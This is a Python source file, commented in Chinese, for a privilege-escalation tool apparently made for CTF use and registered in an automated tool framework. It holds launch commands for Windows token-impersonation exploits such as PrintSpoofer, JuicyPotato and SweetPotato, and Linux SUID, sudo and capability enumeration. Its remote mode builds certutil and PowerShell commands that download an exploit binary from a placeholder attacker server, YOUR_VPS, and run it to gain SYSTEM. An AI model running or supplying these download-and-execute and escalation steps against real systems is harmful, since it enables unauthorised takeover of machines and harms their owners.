# tools/privesc_tool.py
"""
Privilege Escalation Tool - Windows/Linux提权工具

功能:
- Windows: PrintSpoofer, SweetPotato, RoguePotato, JuicyPotato
- Linux: SUID扫描, SUDO滥用, 内核漏洞检测
- 自动检测可用提权方法

CTF场景优化:
- 自动识别系统版本
- 推荐最佳提权方法
- 一键执行提权
"""
import re
import os
import json
import shutil
import subprocess
from typing import Dict, Any, Optional, List
from dataclasses import dataclass
from tool_framework import CommandLineTool


@dataclass
class PrivEscMethod:
    """提权方法"""
    name: str
    os_type: str  # windows, linux
    description: str
    command: str
    confidence: float
    requirements: List[str]


class PrivEscTool(CommandLineTool):
    """
    提权工具封装

    支持方法:
    Windows:
    - PrintSpoofer
    - SweetPotato
    - RoguePotato
    - JuicyPotato
    - sp_oacreate (MSSQL)
    - Rotten Potato

    Linux:
    - SUID/SUDO滥用
    - 内核漏洞 (dirty cow, etc.)
    - Docker逃逸
    """

    # Windows提权工具
    WINDOWS_TOOLS = {
        "printspoofer": {
            "binary": "PrintSpoofer.exe",
            "command": "PrintSpoofer.exe -i -c cmd",
            "description": "PrintSpoofer提权 (支持Win10/2016+)"
        },
        "sweetpotato": {
            "binary": "SweetPotato.exe",
            "command": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe",
            "description": "SweetPotato (COM/DCOM滥用)"
        },
        "roguepotato": {
            "binary": "RoguePotato.exe",
            "command": "RoguePotato.exe -l 9999 -p cmd.exe",
            "description": "RoguePotato (需要开放端口)"
        },
        "juicypotato": {
            "binary": "JuicyPotato.exe",
            "command": "JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe",
            "description": "JuicyPotato (Win10前版本)"
        },
        "badpotato": {
            "binary": "BadPotato.exe",
            "command": "BadPotato.exe cmd.exe",
            "description": "BadPotato"
        }
    }

    # Linux提权方法
    LINUX_METHODS = {
        "suid_scan": {
            "command": "find / -perm -4000 -type f 2>/dev/null",
            "description": "扫描SUID文件"
        },
        "sudo_list": {
            "command": "sudo -l",
            "description": "检查sudo权限"
        },
        "kernel_exploit": {
            "command": "uname -a && cat /etc/issue",
            "description": "内核版本检测"
        },
        "docker_escape": {
            "command": "cat /proc/1/cgroup",
            "description": "检测Docker环境"
        },
        "capabilites": {
            "command": "getcap -r / 2>/dev/null",
            "description": "扫描Capabilities"
        }
    }

    def __init__(self):
        self.tools_dir = os.path.join("data", "tools", "privesc")
        self.cmd_path = "bash"
        super().__init__(self.cmd_path)
        self.timeout = 120

    def name(self) -> str:
        return "privesc"

    def description(self) -> str:
        return "Windows/Linux提权工具，支持多种提权方法。"

    def supported_vulns(self) -> list:
        return [
            "Privilege Escalation",
            "Windows Privesc",
            "Linux Privesc",
            "SUID Exploitation",
            "Token Manipulation"
        ]

    def check_available(self) -> bool:
        """检查工具可用性"""
        # Linux环境检查
        if os.name == 'posix':
            return True
        # Windows环境检查
        return os.path.exists(self.tools_dir)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: check/exploit/list",
                "required": True
            },
            "os_type": {
                "type": "str",
                "description": "系统类型: windows/linux",
                "required": False,
                "default": "auto"
            },
            "method": {
                "type": "str",
                "description": "提权方法 (如 printspoofer, sweetpotato)",
                "required": False
            },
            "shell_session": {
                "type": "str",
                "description": "shell会话标识",
                "required": False
            },
            "os_version": {
                "type": "str",
                "description": "操作系统版本",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行提权操作"""
        action = params.get("action", "check")
        os_type = params.get("os_type", "auto")
        method = params.get("method")

        # 自动检测系统类型
        if os_type == "auto":
            os_type = self._detect_os(params)

        if action == "check":
            return self._check_methods(os_type, params)
        elif action == "exploit":
            if not method:
                return {"error": "必须指定提权方法", "success": False}
            return self._exploit(os_type, method, params)
        elif action == "list":
            return self._list_methods(os_type)
        else:
            return {"error": f"未知操作: {action}", "success": False}

    def _detect_os(self, params: Dict) -> str:
        """检测操作系统类型"""
        session = params.get("shell_session")
        if session:
            # 从会话信息推断
            if "windows" in session.lower() or "cmd" in session.lower():
                return "windows"
            return "linux"
        # 默认根据当前系统
        return "windows" if os.name == 'nt' else "linux"

    def _check_methods(self, os_type: str, params: Dict) -> Dict:
        """检查可用的提权方法"""
        available_methods = []

        if os_type == "windows":
            # Windows环境检查
            os_version = params.get("os_version", "")
            shell_session = params.get("shell_session")

            # 检查工具文件
            for method_name, method_info in self.WINDOWS_TOOLS.items():
                binary = method_info["binary"]
                binary_path = os.path.join(self.tools_dir, binary)

                available = False
                if os.path.exists(binary_path):
                    available = True

                # 特定版本的兼容性检查
                confidence = 0.5
                if method_name == "printspoofer" and ("2016" in os_version or "10" in os_version):
                    confidence = 0.9
                elif method_name == "sweetpotato":
                    confidence = 0.8
                elif method_name == "juicypotato" and "2012" in os_version:
                    confidence = 0.9

                available_methods.append(PrivEscMethod(
                    name=method_name,
                    os_type="windows",
                    description=method_info["description"],
                    command=method_info["command"],
                    confidence=confidence,
                    requirements=["SeImpersonatePrivilege"] if method_name in ["printspoofer", "sweetpotato", "juicypotato"] else []
                ))

        else:
            # Linux环境检查
            for method_name, method_info in self.LINUX_METHODS.items():
                available_methods.append(PrivEscMethod(
                    name=method_name,
                    os_type="linux",
                    description=method_info["description"],
                    command=method_info["command"],
                    confidence=0.6,
                    requirements=[]
                ))

        # 按置信度排序
        available_methods.sort(key=lambda m: m.confidence, reverse=True)

        return {
            "success": True,
            "os_type": os_type,
            "available_methods": [
                {
                    "name": m.name,
                    "description": m.description,
                    "confidence": m.confidence,
                    "requirements": m.requirements,
                    "command": m.command
                }
                for m in available_methods
            ],
            "recommendation": available_methods[0].name if available_methods else None
        }

    def _exploit(self, os_type: str, method: str, params: Dict) -> Dict:
        """执行提权"""
        shell_session = params.get("shell_session")

        if os_type == "windows":
            if method not in self.WINDOWS_TOOLS:
                return {"error": f"未知的提权方法: {method}", "success": False}

            method_info = self.WINDOWS_TOOLS[method]
            binary = method_info["binary"]
            command = method_info["command"]

            # 检查工具是否存在
            binary_path = os.path.join(self.tools_dir, binary)
            if not os.path.exists(binary_path):
                return {
                    "error": f"提权工具不存在: {binary}",
                    "success": False,
                    "hint": f"下载 {binary} 并放到 {self.tools_dir}/"
                }

            # 如果有shell会话，生成上传和执行命令
            if shell_session:
                return self._generate_remote_privesc(binary, command, params)

            # 本地执行
            try:
                result = self._run_command(
                    [binary_path] + command.split()[1:],
                    timeout=self.timeout,
                    stream_output=True
                )
                return {
                    "success": result.get("success", False),
                    "method": method,
                    "output": result.get("stdout", ""),
                    "error": result.get("stderr", "")
                }
            except Exception as e:
                return {"error": str(e), "success": False}

        else:
            # Linux提权
            if method not in self.LINUX_METHODS:
                return {"error": f"未知的提权方法: {method}", "success": False}

            command = self.LINUX_METHODS[method]["command"]

            try:
                result = self._run_command(command.split(), timeout=self.timeout, stream_output=True)
                output = result.get("stdout", "")

                # 解析SUID扫描结果
                if method == "suid_scan" and output:
                    suspicious = self._analyze_suid(output)
                    return {
                        "success": True,
                        "method": method,
                        "output": output,
                        "suspicious_files": suspicious,
                        "recommendation": "检查可疑的SUID文件是否有提权漏洞"
                    }

                return {
                    "success": True,
                    "method": method,
                    "output": output
                }
            except Exception as e:
                return {"error": str(e), "success": False}

    def _generate_remote_privesc(self, binary: str, command: str, params: Dict) -> Dict:
        """生成远程提权命令"""
        binary_path = os.path.join(self.tools_dir, binary)

        # 生成上传命令
        upload_commands = {
            "certutil": f"certutil -urlcache -split -f http://YOUR_VPS/{binary} C:\\temp\\{binary}",
            "powershell": f"Invoke-WebRequest -Uri http://YOUR_VPS/{binary} -OutFile C:\\temp\\{binary}"
        }

        # 执行命令
        exec_command = f"C:\\temp\\{binary} {command}"

        return {
            "success": True,
            "mode": "remote",
            "shell_session": params.get("shell_session"),
            "upload_commands": upload_commands,
            "exec_command": exec_command,
            "full_workflow": f"""
# 1. 上传工具
{upload_commands['certutil']}

# 2. 执行提权
{exec_command}

# 3. 验证权限
whoami /priv
"""
        }

    def _analyze_suid(self, output: str) -> List[Dict]:
        """分析SUID扫描结果"""
        suspicious_bins = [
            "nmap", "vim", "find", "bash", "less", "more", "nano",
            "cp", "mv", "tar", "zip", "git", "curl", "wget", "awk"
        ]

        findings = []
        for line in output.split('\n'):
            line = line.strip()
            if not line:
                continue

            for bin_name in suspicious_bins:
                if f"/{bin_name}" in line or line.endswith(bin_name):
                    findings.append({
                        "path": line,
                        "binary": bin_name,
                        "exploit_hint": f"尝试: {bin_name} -p 或 GTFOBins查找利用方法"
                    })

        return findings

    def _list_methods(self, os_type: str) -> Dict:
        """列出可用的提权方法"""
        if os_type == "windows":
            methods = list(self.WINDOWS_TOOLS.keys())
        else:
            methods = list(self.LINUX_METHODS.keys())

        return {
            "success": True,
            "os_type": os_type,
            "methods": methods
        }


def register():
    """注册提权工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(PrivEscTool())